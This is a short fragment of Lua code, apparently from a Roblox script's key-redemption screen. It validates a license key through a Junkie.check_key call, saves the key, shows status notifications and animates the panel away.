        redeemBtn.Active = false
        task.wait(0.3)

        local success, result = pcall(function() return Junkie.check_key(key) end)
        redeemBtn.Active = true

        if not success or not result then
            setStatus("error")
            Notify("Error", "Failed to connect to server", 3, "error")
            return
        end

        if result.valid then
            saveKey(key)
            getgenv().SCRIPT_KEY = key
            setStatus("success")
            Notify("Success", "License validated successfully!", 2, "success")
            task.wait(1)
            TweenService:Create(mainFrame, TweenInfo.new(0.4, Enum.EasingStyle.Quart), {
                Position = UDim2.new(0.5, 0, -0.5, 0),
                BackgroundTransparency = 1
            }):Play()
